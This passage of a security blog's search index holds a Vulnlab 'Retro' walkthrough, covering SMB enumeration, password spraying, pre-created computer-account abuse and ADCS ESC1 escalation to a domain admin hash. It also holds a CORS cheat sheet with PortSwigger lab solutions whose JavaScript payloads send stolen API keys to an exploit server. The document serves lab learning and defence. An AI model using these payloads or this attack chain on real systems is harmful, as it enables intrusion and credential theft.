ffe1:2ad8:4117:4568:d611:7914:ebb1:55ee\n| SHA-1: b8d3:ebe0:0f22:16f8:3dda:1fc4:85e4:7a3f:fedc:f749\n| -----BEGIN CERTIFICATE-----\n| MIIC2jCCAcKgAwIBAgIQFdODfzdLvL5J3XDHt1LQ2TANBgkqhkiG9w0BAQsFADAW\n| MRQwEgYDVQQDEwtEQy5yZXRyby52bDAeFw0yNDA3MDMxNDU0MzNaFw0yNTAxMDIx\n| NDU0MzNaMBYxFDASBgNVBAMTC0RDLnJldHJvLnZsMIIBIjANBgkqhkiG9w0BAQEF\n| AAOCAQ8AMIIBCgKCAQEAyZHMAjboQwXUiBzlJAcCAa1bFfTKHC7O2saNi/FdCRIz\n| 3iBLeBoCWN7YOPHjBVkNJFJTqrgZl3BX7oOSZ+QOIimJqgYu98zNUuZUf4sxC7MB\n| 3gem6bhPKuU0Zylj0Krl9j+fLMO5uB7hNc0elTyG0xss3Q/bvlA10A7yl7+iOPp/\n| 5yNkC/UksecJ2W9IybMNuygdaD3QPieaG3pwqfxp1NXmZQfBDuC7wKLLjBnvmvWm\n| 9fQUa1v/Wb+eZ6xuNCshfkRg5uH5wEHFp9mppIlAp9OXpqM5jyHX9kZX3KGktchS\n| JBl8edLWpfBgmn8fXRBjUeGvnnPIsp+GsQHhPwchPQIDAQABoyQwIjATBgNVHSUE\n| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAB6b\n| V8+nHs3eRQrrz9pOxuqfFwUPtqs5LXtYPErxfIjoNzgdz7PBYF3lDCpwAwX0ChyH\n| TyZGWnQLfUDvNv3XyQ3OLlGy6MnDfVPukbn/EDgpX78cJREqv7jgIaivIRE/TnGk\n| 9BdZEDf6gqd+rxWVdOzEq3HhcHi17QGKeQujx3+jiKlflHkuV5jH/ZlAapXYRhJ2\n| L5YhhHNxGK54PxDL7QVs7IVt06PGOn/6i5Tgeh/w8O0f4Bqt1orob6vaZxKCjAYy\n| ljrbSm8pBDnN6ylQxF/kh7LMpjt4ru7WkTgu3Px7lgBDL2onqBnRK24pna/gQ/DZ\n| 1rHj6K+M9vMhQIHsQ1Y=\n|_-----END CERTIFICATE-----\n49672/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -1s, deviation: 0s, median: -1s\n| p2p-conficker:\n|   Checking for Conficker.C or higher...\n|   Check 1 (port 30448/tcp): CLEAN (Timeout)\n|   Check 2 (port 50684/tcp): CLEAN (Timeout)\n|   Check 3 (port 47219/udp): CLEAN (Timeout)\n|   Check 4 (port 49250/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-time:\n|   date: 2024-07-04T15:04:16\n|_  start_date: N/A\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n</code></pre> <p>We can see from the nmap scan that there are a fair number of ports open. Additionally, it is likely that this machine is a domain controller based on the presence of Kerberos (port 88), LDAP (ports 389/636), etc. </p>","tags":["adcs","pre-created-computer-accounts"]},{"location":"blog/2024/07/04/vulnlab-retro.html#service-enumeration","title":"Service Enumeration","text":"","tags":["adcs","pre-created-computer-accounts"]},{"location":"blog/2024/07/04/vulnlab-retro.html#smb","title":"SMB","text":"<p>We can get the general information for the SMB service using <code>netexec</code>. As shown below, the machine name is <code>DC</code> and the domain is <code>retro.vl</code>. </p> <pre><code>\u279c  retro nxc smb $ip\nSMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\n</code></pre> <p>Another check reveals that we have anonymous access to a number of shares, including the <code>Trainees</code> share, as well as the <code>IPC$</code> share. </p> <pre><code>\u279c  retro nxc smb $ip -u 'anonymous' -p '' --shares\nSMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.88.241    445    DC               [+] retro.vl\\anonymous: (Guest)\nSMB         10.10.88.241    445    DC               [*] Enumerated shares\nSMB         10.10.88.241    445    DC               Share           Permissions     Remark\nSMB         10.10.88.241    445    DC               -----           -----------     ------\nSMB         10.10.88.241    445    DC               ADMIN$                          Remote Admin\nSMB         10.10.88.241    445    DC               C$                              Default share\nSMB         10.10.88.241    445    DC               IPC$            READ            Remote IPC\nSMB         10.10.88.241    445    DC               NETLOGON                        Logon server share\nSMB         10.10.88.241    445    DC               Notes\nSMB         10.10.88.241    445    DC               SYSVOL                          Logon server share\nSMB         10.10.88.241    445    DC               Trainees        READ\n</code></pre> <p>With read access to the <code>IPC$</code> share, we can use the <code>--rid-brute</code> method in <code>netexec</code> to get a list of domain user and group objects. </p> <pre><code>\u279c  retro nxc smb $ip -u 'anonymous' -p '' --rid-brute\nSMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.88.241    445    DC               [+] retro.vl\\anonymous: (Guest)\nSMB         10.10.88.241    445    DC               498: RETRO\\Enterprise Read-only Domain Controllers (SidTypeGroup)\nSMB         10.10.88.241    445    DC               500: RETRO\\Administrator (SidTypeUser)\nSMB         10.10.88.241    445    DC               501: RETRO\\Guest (SidTypeUser)\nSMB         10.10.88.241    445    DC               502: RETRO\\krbtgt (SidTypeUser)\nSMB         10.10.88.241    445    DC               512: RETRO\\Domain Admins (SidTypeGroup)\nSMB         10.10.88.241    445    DC               513: RETRO\\Domain Users (SidTypeGroup)\nSMB         10.10.88.241    445    DC               514: RETRO\\Domain Guests (SidTypeGroup)\nSMB         10.10.88.241    445    DC               515: RETRO\\Domain Computers (SidTypeGroup)\nSMB         10.10.88.241    445    DC               516: RETRO\\Domain Controllers (SidTypeGroup)\nSMB         10.10.88.241    445    DC               517: RETRO\\Cert Publishers (SidTypeAlias)\nSMB         10.10.88.241    445    DC               518: RETRO\\Schema Admins (SidTypeGroup)\nSMB         10.10.88.241    445    DC               519: RETRO\\Enterprise Admins (SidTypeGroup)\nSMB         10.10.88.241    445    DC               520: RETRO\\Group Policy Creator Owners (SidTypeGroup)\nSMB         10.10.88.241    445    DC               521: RETRO\\Read-only Domain Controllers (SidTypeGroup)\nSMB         10.10.88.241    445    DC               522: RETRO\\Cloneable Domain Controllers (SidTypeGroup)\nSMB         10.10.88.241    445    DC               525: RETRO\\Protected Users (SidTypeGroup)\nSMB         10.10.88.241    445    DC               526: RETRO\\Key Admins (SidTypeGroup)\nSMB         10.10.88.241    445    DC               527: RETRO\\Enterprise Key Admins (SidTypeGroup)\nSMB         10.10.88.241    445    DC               553: RETRO\\RAS and IAS Servers (SidTypeAlias)\nSMB         10.10.88.241    445    DC               571: RETRO\\Allowed RODC Password Replication Group (SidTypeAlias)\nSMB         10.10.88.241    445    DC               572: RETRO\\Denied RODC Password Replication Group (SidTypeAlias)\nSMB         10.10.88.241    445    DC               1000: RETRO\\DC$ (SidTypeUser)\nSMB         10.10.88.241    445    DC               1101: RETRO\\DnsAdmins (SidTypeAlias)\nSMB         10.10.88.241    445    DC               1102: RETRO\\DnsUpdateProxy (SidTypeGroup)\nSMB         10.10.88.241    445    DC               1104: RETRO\\trainee (SidTypeUser)\nSMB         10.10.88.241    445    DC               1106: RETRO\\BANKING$ (SidTypeUser)\nSMB         10.10.88.241    445    DC               1107: RETRO\\jburley (SidTypeUser)\nSMB         10.10.88.241    445    DC               1108: RETRO\\HelpDesk (SidTypeGroup)\nSMB         10.10.88.241    445    DC               1109: RETRO\\tblack (SidTypeUser)\n</code></pre> <p>Narrowing this down to just the <code>SidTypeUser</code> objects, we get this list. We could remove the <code>krbtgt</code> user from this list because it's not a user that would be logging into anything. </p> <pre><code>Administrator\nGuest\nkrbtgt\nDC$\ntrainee\nBANKING$\njburley\ntblack\n</code></pre> <p>Now that we have a list of users, we can set that aside for a moment and check the shares to which we have anonymous access.  </p> <pre><code>\u279c  retro smbclient.py -dc-ip $ip anonymous@$ip\nImpacket v0.12.0.dev1+20240626.193148.f827c8c7 - Copyright 2023 Fortra\n\nPassword:\nType help for list of commands\n# shares\nADMIN$\nC$\nIPC$\nNETLOGON\nNotes\nSYSVOL\nTrainees\n</code></pre> <p>Checking the <code>Trainees</code> share, we find a text file named <code>Important.txt</code> that we can grab. </p> <pre><code># use Trainees\n# ls\ndrw-rw-rw-          0  Sun Jul 23 17:16:11 2023 .\ndrw-rw-rw-          0  Wed Jul 26 04:54:14 2023 ..\n-rw-rw-rw-        288  Sun Jul 23 17:16:11 2023 Important.txt\n# get Important.txt\n</code></pre> <p>The <code>Important.txt</code> file includes a hint that all trainees are now lumped under one account with a common password. </p> <pre><code>Dear Trainees,\n\nI know that some of you seemed to struggle with remembering strong and unique passwords.\nSo we decided to bundle every one of you up into one account.\nStop bothering us. Please. We have other stuff to do than resetting your password every day.\n\nRegards\n\nThe Admins\n</code></pre> <p>Since there's no other files present that might contain credentials, we can try spraying weak and/or common credentials against the list of usernames we enumerated earlier. We can also check to see if any users are using their username as a password. </p> <p>Doing this, we find that <code>trainee:trainee</code> worked. </p> <pre><code>\u279c  retro nxc smb $ip -u users -p users --no-bruteforce --continue-on-success\nSMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.88.241    445    DC               [-] retro.vl\\Administrator:Administrator STATUS_LOGON_FAILURE\nSMB         10.10.88.241    445    DC               [-] retro.vl\\Guest:Guest STATUS_LOGON_FAILURE\nSMB         10.10.88.241    445    DC               [-] retro.vl\\DC$:DC$ STATUS_LOGON_FAILURE\nSMB         10.10.88.241    445    DC               [+] retro.vl\\trainee:trainee\nSMB         10.10.88.241    445    DC               [-] retro.vl\\BANKING$:BANKING$ STATUS_LOGON_FAILURE\nSMB         10.10.88.241    445    DC               [-] retro.vl\\jburley:jburley STATUS_LOGON_FAILURE\nSMB         10.10.88.241    445    DC               [-] retro.vl\\tblack:tblack STATUS_LOGON_FAILURE\n</code></pre> <p>Checking share permissions again with that user shows that we now have access to the <code>Notes</code> share. Looking into that share with <code>smbclient.py</code> we find a text file named <code>ToDo.txt</code>. </p> <p>We can get <code>ToDo.txt</code> out of the Notes share and read it. </p> <pre><code>\u279c  retro smbclient.py -dc-ip $ip trainee:trainee@$ip\nImpacket v0.12.0.dev1+20240626.193148.f827c8c7 - Copyright 2023 Fortra\n\nType help for list of commands\n# shares\nADMIN$\nC$\nIPC$\nNETLOGON\nNotes\nSYSVOL\nTrainees\n# use Notes\n# ls\ndrw-rw-rw-          0  Sun Jul 23 17:03:16 2023 .\ndrw-rw-rw-          0  Wed Jul 26 04:54:14 2023 ..\n-rw-rw-rw-        248  Sun Jul 23 17:05:56 2023 ToDo.txt\n# get ToDo.txt\n</code></pre> <p>The contents of the <code>ToDo.txt</code> file indicate that there is a pre-created computer account in use in the environment. </p> <pre><code>\u279c  retro cat ToDo.txt\nThomas,\n\nafter convincing the finance department to get rid of their ancienct banking software\nit is finally time to clean up the mess they made. We should start with the pre created\ncomputer account. That one is older than me.\n\nBest\n\nJames \n</code></pre>","tags":["adcs","pre-created-computer-accounts"]},{"location":"blog/2024/07/04/vulnlab-retro.html#foothold","title":"Foothold","text":"<p>Digging into the following article gives us an idea of the way ahead. </p> <p>TrustedSec: Diving Into Pre-Created Computer Accounts</p> <p>Essentially, if the computer account was created with the <code>Assign this computer account as a pre-Windows 2000 computer</code> option checked, the password will be the same as the computer name, except lowercase and without the \"$\" at the end.</p> <p>We also find some useful information in a Wayback archive. </p> <p></p> <p>So in our case, we can test the <code>banking$</code> account with the password <code>banking</code>. Using <code>netexec</code>, I did get the <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> error message described in the article. </p> <p>Working on the assumption that the <code>banking$</code> account was created as a pre-Windows 2000 computer, we can attempt to change the password for the <code>banking$</code> machine account</p> <pre><code>\u279c  retro kpasswd banking$\nPassword for banking$@RETRO.VL:\nEnter new password:\nEnter it again:\nPassword changed.\n</code></pre> <p>Perfect! That worked, but please note that I needed to make some modifications to the <code>/etc/krb5.conf</code> file prior to changing the password. </p> <pre><code>\u279c  retro cat /etc/krb5.conf\n[libdefaults]\n        default_realm = RETRO.VL\n        dns_lookup_realm = false\n        ticket_lifetime = 24h\n        renew_lifetime = 7d\n        rdns = false\n        kdc_timesync = 1\n        ccache_type = 4\n        forwardable = true\n        proxiable = true\n\n\n[realms]\n        RETRO.VL = {\n                kdc = DC.RETRO.VL\n                admin_server = DC.RETRO.VL\n                }\n</code></pre> <p>We can now authenticate with the new password. </p> <pre><code>\u279c  retro nxc smb $ip -u 'banking$' -p 'Password123'\nSMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.88.241    445    DC               [+] retro.vl\\banking$:Password123\n</code></pre> <p>Now that we have working credentials for the <code>banking$</code> computer account, we can do additional enumeration. One thing to check is Active Directory Certificate Services (ADCS). A quick check with <code>netexec</code> shows that ADCS is in use. </p> <pre><code>\u279c  retro nxc ldap $ip -u 'banking$' -p 'Password123' -M adcs\nSMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.88.241    389    DC               [+] retro.vl\\banking$:Password123\nADCS        10.10.88.241    389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'\nADCS        10.10.88.241    389    DC               Found PKI Enrollment Server: DC.retro.vl\nADCS        10.10.88.241    389    DC               Found CN: retro-DC-CA\n</code></pre>","tags":["adcs","pre-created-computer-accounts"]},{"location":"blog/2024/07/04/vulnlab-retro.html#privilege-escalation","title":"Privilege Escalation","text":"<p>Knowing that ADCS is in use, we can enumerate vulnerable templates with <code>certipy</code>. It looks like there's a template that's misconfigured to be vulnerable to an escalation method known as <code>ESC1</code>. The main issue with this misconfiguration is the ability for the attacker to specify a different <code>subjectAltName</code> (SAN) when making the certificate request, essentially allowing the attacker to request a certificate as any user in the domain. In order to abuse ESC1, the following must be true:</p> <ul> <li>Low privileged users are granted enrollment rights</li> <li>Manager approval is not required</li> <li>No authorized signatures are required</li> <li>The certificate template defines EKUs that enable authentication</li> <li>Requestors are able to specify a SAN when requesting the certificate</li> </ul> <pre><code>\u279c  retro certipy find -dc-ip $ip -u 'banking$' -p 'Password123' -enabled -vulnerable -stdout\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA\n[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration for 'retro-DC-CA' via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Got CA configuration for 'retro-DC-CA'\n[*] Enumeration output:\nCertificate Authorities\n  0\n    CA Name                             : retro-DC-CA\n    DNS Name                            : DC.retro.vl\n    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl\n    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85\n    Certificate Validity Start          : 2023-07-23 21:03:51+00:00\n    Certificate Validity End            : 2028-07-23 21:13:50+00:00\n    Web Enrollment                      : Disabled\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Permissions\n      Owner                             : RETRO.VL\\Administrators\n      Access Rights\n        ManageCertificates              : RETRO.VL\\Administrators\n                                          RETRO.VL\\Domain Admins\n                                          RETRO.VL\\Enterprise Admins\n        ManageCa                        : RETRO.VL\\Administrators\n                                          RETRO.VL\\Domain Admins\n                                          RETRO.VL\\Enterprise Admins\n        Enroll                          : RETRO.VL\\Authenticated Users\nCertificate Templates\n  0\n    Template Name                       : RetroClients\n    Display Name                        : Retro Clients\n    Certificate Authorities             : retro-DC-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Enrollment Flag                     : None\n    Extended Key Usage                  : Client Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Validity Period                     : 1 year\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 4096\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : RETRO.VL\\Domain Admins\n                                          RETRO.VL\\Domain Computers\n                                          RETRO.VL\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : RETRO.VL\\Administrator\n        Write Owner Principals          : RETRO.VL\\Domain Admins\n                                          RETRO.VL\\Enterprise Admins\n                                          RETRO.VL\\Administrator\n        Write Dacl Principals           : RETRO.VL\\Domain Admins\n                                          RETRO.VL\\Enterprise Admins\n                                          RETRO.VL\\Administrator\n        Write Property Principals       : RETRO.VL\\Domain Admins\n                                          RETRO.VL\\Enterprise Admins\n                                          RETRO.VL\\Administrator\n    [!] Vulnerabilities\n      ESC1                              : 'RETRO.VL\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication\n</code></pre> <p>So reviewing the <code>RetroClients</code> template, we can observe the following:</p> <ul> <li>\u2705 <code>RETRO.VL\\Domain Computers</code> have enrollment rights - we control the <code>banking$</code> computer account. </li> <li>\u2705 <code>Requires Manager Approval</code> is set to <code>False</code></li> <li>\u2705 <code>Authorized Signatures Required</code> is set to <code>0</code></li> <li>\u2705 The <code>Extended Key Usage</code> is set to <code>Client Authentication</code> meaning we can use this certificate to authenticate in the domain</li> <li>\u2705 The <code>Enrollee Supplies Subject</code> is set to <code>True</code>, meaning that requestors can specify a SAN. </li> </ul> <p>Now that we know the <code>RetroClients</code> template is vulnerable to ESC1, we can request a certificate with <code>certipy</code>. </p> <pre><code>\u279c  retro certipy req -dc-ip $ip -u 'banking$' -p 'Password123' -ca retro-DC-CA -template RetroClients -upn Administrator -key-size 4096\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 10\n[*] Got certificate with UPN 'Administrator'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n</code></pre> <p>Now we can authenticate using that certificate. </p> <pre><code>\u279c  retro certipy auth -pfx administrator.pfx -username administrator -domain retro.vl -dc-ip $ip\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@retro.vl\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389\n</code></pre> <p>Perfect! We've got an NTLM hash for the domain administrator. We can pass that hash with <code>netexec</code>. Here we find that we're able to authenticate with that NT hash, and that we do in fact have administrative access on the machine, indicated by <code>(Pwn3d!)</code>. We can now use that hash to log in as the administrator and grab the last flag. </p> <pre><code>\u279c  retro nxc smb $ip -u 'administrator' -H '252fac7066d93dd009d4fd2cd0368389'\nSMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.88.241    445    DC               [+] retro.vl\\administrator:252fac7066d93dd009d4fd2cd0368389 (Pwn3d!)\n</code></pre>","tags":["adcs","pre-created-computer-accounts"]},{"location":"references/index.html","title":"References","text":""},{"location":"references/cheatsheets/CORS/index.html","title":"Cross-Origin Resource Sharing (CORS)","text":"<p>Cross-Origin Resource Sharing (CORS) is a browser security feature that allows a web page from one domain (the \"origin\") to access resources on another domain. It is an extension of the Same-Origin Policy (SOP) and provides a way to relax its restrictions in a controlled manner.</p> <p>While CORS adds flexibility, a misconfigured policy can open the door to cross-domain attacks. It is important to note that CORS is not a protection against Cross-Site Request Forgery (CSRF).</p>"},{"location":"references/cheatsheets/CORS/index.html#same-origin-policy-sop","title":"Same-Origin Policy (SOP)","text":"<p>The Same-Origin Policy is a fundamental security mechanism that restricts how a document or script loaded from one origin can interact with a resource from another origin.</p> <p>An \"origin\" is defined by the combination of the protocol (e.g., <code>http</code>, <code>https</code>), hostname (e.g., <code>www.example.com</code>), and port (e.g., <code>80</code>, <code>443</code>). If all three match, the origins are the same.</p> <p>Example: If a page is loaded from <code>https://www.example.com</code>, the following table shows which URLs it can and cannot access data from according to the SOP:</p> URL Same Origin? Reason <code>https://www.example.com/page.html</code> Yes Same protocol, host, and port. <code>http://www.example.com</code> No Different protocol (HTTP vs. HTTPS). <code>https://store.example.com</code> No Different hostname (subdomain). <code>https://www.example.com:8080</code> No Different port. <p>SOP</p> <p>The SOP generally allows a domain to send requests to other domains, but it prevents the requesting domain from reading the responses.</p>"},{"location":"references/cheatsheets/CORS/index.html#how-cors-works","title":"How CORS Works","text":"<p>CORS allows servers to explicitly specify which origins are permitted to access their resources. This is done through HTTP headers.</p> <ul> <li><code>Access-Control-Allow-Origin</code>: This is the most important CORS header. The server includes this header in its response to indicate which origins are allowed. For example:</li> </ul> <pre><code>Access-Control-Allow-Origin: https://www.trusted-site.com\n</code></pre> <p>A wildcard (<code>*</code>) can be used, but this is often insecure as it allows any domain to access the resource.</p> <ul> <li> <p><code>Access-Control-Allow-Credentials: true</code>: Indicates cross-origin requests can include cookies.  </p> </li> <li> <p>Preflight Requests: For requests that can modify data (e.g., <code>PUT</code>, <code>DELETE</code>) or use certain headers, the browser first sends a \"preflight\" request using the <code>OPTIONS</code> method. This request checks if the server understands and approves the actual request. If the server responds favorably to the <code>OPTIONS</code> request, the browser then sends the actual request.</p> </li> </ul> PortSwigger CORS Lab 1: CORS vulnerability with basic origin reflection <p>Instructions</p> <p>This website has an insecure CORS configuration in that it trusts all origins.</p> <p>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.</p> <p>You can log in to your own account using the following credentials:\u00a0<code>wiener:peter</code></p> <p>Exploit</p> <p>There is a API key leaked on the <code>accountDetails</code> endpoint</p> <p> Looking at this in the proxy shows the request and response.</p> <pre><code>GET /accountDetails HTTP/1.1\nHost: 0a6300590490f183806703ee00fc00ea.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a6300590490f183806703ee00fc00ea.web-security-academy.net/my-account?id=wiener\nConnection: keep-alive\nCookie: session=vkjmdpJMH5KB0bv3S6fwEs4msYf62T7O\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=4\n</code></pre> <pre><code>HTTP/1.1 200 OK\nAccess-Control-Allow-Credentials: true\nContent-Type: application/json; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 149\n\n{\n    \"username\": \"wiener\",\n    \"email\": \"\",\n    \"apikey\": \"o5BObzi7TrabVjCMQedPZO3Zhwams76K\",\n    \"sessions\": [\n        \"vkjmdpJMH5KB0bv3S6fwEs4msYf62T7O\"\n    ]\n}\n</code></pre> <p>If we send another request with an arbitrary Origin header, we see that the arbitrary value is reflected in the <code>Access-Control-Allow-Origin</code> response header. This means that a site on any origin can make requests to the vulnerable site and read the responses. </p> <p></p> <p>We can use the payload from Payloadsallthethings at https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#origin-reflection</p> <pre><code>var req = new XMLHttpRequest(); \nreq.onload = reqListener; \nreq.open('get','https://0a6300590490f183806703ee00fc00ea.web-security-academy.net/accountDetails',true); \nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\n    location='//exploit-0a6500ab0499f17080cb0247015a00ab.exploit-server.net/log?key='+this.responseText; \n};\n</code></pre> <p>Put this in the exploit server</p> <p></p> <p>After clicking \"Deliver exploit to victim\", we can check the access log and find the administrator's API key.</p> <p></p> <p>After submitting the admin's API key we finish the lab. </p>"},{"location":"references/cheatsheets/CORS/index.html#parsing-errors","title":"Parsing Errors","text":"<p>Be sure to check for errors in <code>Origin</code> header parsing.</p> <p>For example, suppose an application grants access to all domains ending in:</p> <p><code>normal-website.com</code></p> <p>Maybe try:</p> <ul> <li>hackersnormal-website.com</li> <li>normal-website.com.evil-user.net</li> </ul> <p>Also check arbitrary subdomains:</p> <ul> <li>evil.normal-website.com</li> </ul>"},{"location":"references/cheatsheets/CORS/index.html#whilelisted-null-origin-value","title":"Whilelisted NULL origin value","text":"<p>The specification for the Origin header supports the value\u00a0<code>null</code>. Browsers might send the value\u00a0<code>null</code>\u00a0in the Origin header in various unusual situations:</p> <ul> <li>Cross-origin redirects.</li> <li>Requests from serialized data.</li> <li>Request using the\u00a0<code>file:</code>\u00a0protocol.</li> <li>Sandboxed cross-origin requests.</li> </ul> PortSwigger CORS lab 2: CORS vulnerability with trusted null origin <p>Instructions</p> <p>This website has an insecure CORS configuration in that it trusts the \"null\" origin.</p> <p>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.</p> <p>You can log in to your own account using the following credentials:\u00a0<code>wiener:peter</code></p> <p>Exploit</p> <p>The website shows an API key on the <code>accountDetails</code> page.</p> <p></p> <p>Sending an arbitrary domain in the request Origin header does nothing</p> <p></p> <p>However, sending <code>null</code> gets reflected in the response ACAO header.</p> <p></p> <p>Since the null origin is reflected, we can use the following payload to snag the admin's API key.</p> <pre><code>&lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, &lt;script&gt;\n  var req = new XMLHttpRequest();\n  req.onload = reqListener;\n  req.open('get','https://0adb00af04759e1980f703df00da0006.web-security-academy.net/accountDetails',true);\n  req.withCredentials = true;\n  req.send();\n\n  function reqListener() {\n    location='https://exploit-0a310064045b9e858037027701af008a.exploit-server.net/log?key='+encodeURIComponent(this.responseText);\n   };\n&lt;/script&gt;\"&gt;&lt;/iframe&gt; \n</code></pre> <p>Nice. We got the request from the admin containing the API key.</p> <p>Submit the key and solve the lab. </p>"},{"location":"references/cheatsheets/CORS/index.html#exploiting-xss-via-cors-trust-relationships","title":"Exploiting XSS via CORS Trust Relationships","text":"<p>If the vulnerable site trusts an origin that is vulnerable to XSS, then the attacker might be able to inject JavaScript on the trusted site that uses CORS to steal sensitive information from the trusting site. </p> PortSwigger CORS Lab 3: CORS vulnerability with trusted insecure protocols <p>Instructions</p> <p>This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.</p> <p>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.</p> <p>You can log in to your own account using the following credentials:\u00a0<code>wiener:peter</code></p> <p>Exploit</p> <p>Like other labs in this section, there is an API key on the <code>accountDetails</code> page. </p> <p></p> <p>After looking around a little bit, we find that the application is making a call to the insecure site <code>http://stock.0a5000e703c1293d806a497d00c200d4.web-security-academy.net</code>. Checking the client-side code when we check the stock of an item shows the following JavaScript code:</p> <pre><code>&lt;script&gt;\n    const stockCheckForm = document.getElementById(\"stockCheckForm\");\n    stockCheckForm.addEventListener(\"submit\", function(e) {\n        const data = new FormData(stockCheckForm);\n        window.open('http://stock.0a5000e703c1293d806a497d00c200d4.web-security-academy.net/?productId=1&amp;storeId=' + data.get('storeId'), 'stock', 'height=10,width=10,left=10,top=10,menubar=no,toolbar=no,location=no,status=no');\n        e.preventDefault();\n    });\n&lt;/script&gt;\n</code></pre> <p>Note that <code>storeId</code> takes user input and puts it directly into the request. Seems interesting.</p> <p>Sending the following request triggers an alert</p> <pre><code>https://stock.0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/?productId=1%3Cscript%3Ealert(1)%3C/script%3E&amp;storeId=1\n</code></pre> <p></p> <p>Check that the <code>stock</code> subdomain is trusted.</p> <p>And it is. </p> <p></p> <p>We can inject the basic CORS exploit payload into the XSS on the <code>shop</code> subdomain. </p> <p>So the request URL would become</p> <pre><code>&lt;script&gt;\ndocument.location=\"http://stock.0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ac4000c033411d480bf1bcb01920034.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1\"\n&lt;/script&gt;\n</code></pre> <p>Put that in your exploit server and deliver to victim. </p> <p></p> <p>Submit the API key to solve the lab.</p>"},{"location":"references/cheatsheets/CORS/index.html#breaking-tls-with-poorly-configured-cors","title":"Breaking TLS with Poorly Configured CORS","text":"<p>Be sure to check if CORS accepts insecure <code>http</code> sites. </p>"},{"location":"references/cheatsheets/CORS/index.html#preventing-cors-misconfigurations","title":"Preventing CORS Misconfigurations","text":"<ul> <li>If a web resource contains sensitive information, the origin should be properly specified in the <code>Access-Control-Allow-Origin</code> header. </li> <li>Do not dynamically reflect arbitrary origins in the ACAO header.</li> <li>Avoid whitelisting <code>null</code> origins. </li> <li>Avoid using wildcards on internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external 